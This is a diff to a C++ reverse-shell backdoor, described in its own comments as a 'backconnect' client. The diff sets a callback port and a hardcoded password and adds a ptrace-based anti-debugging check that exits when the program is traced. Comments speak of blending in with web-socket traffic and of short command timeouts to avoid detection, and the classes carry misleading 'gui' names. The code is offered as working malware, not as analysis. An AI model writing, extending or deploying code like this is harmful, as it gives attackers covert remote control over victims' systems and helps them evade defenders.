@@ -10,6 +10,7 @@ extern "C"{
     #include <limits.h>
     #include <sys/utsname.h>
     #include <unistd.h>
+    #include <sys/ptrace.h>
     #include <sys/prctl.h>
     #include <sys/socket.h>
     #include <arpa/inet.h> 
@@ -20,14 +21,14 @@ using namespace std;
 struct gui_config{
     const string client_ver = "lol"; // client name 
     const string client_patch = "127.0.0.1"; // host to call back to
-    const string client_buffer = "443"; // port to call back to port 80 and 443 will look like web sockets
-    const string client_key = ""; // password
+    const string client_buffer = "4431"; // port to call back to port 80 and 443 will look like web sockets
+    const string client_key = "lolpass"; // password
     const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
 class gui_bar{
     public:
-        string gui_c(string lc) 
+        string gui_c(string lc)
         {
           if(lc.size() > 1019){
               return "\nfailure, Buffer Overflow detected!"; // oh uh buffer overflow! quickly exit!
@@ -401,6 +402,9 @@ class cli_architecture : gui_config{ // backconnect
 }; cli_architecture ca;
 
 int main(int argc, char *argv[]){
+    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti debugging
+    	return 0; 
+    }
     srand(time(NULL)); 
     signal(SIGPIPE, SIG_IGN);
     signal(SIGCHLD, SIG_IGN); // fuck zombie process's
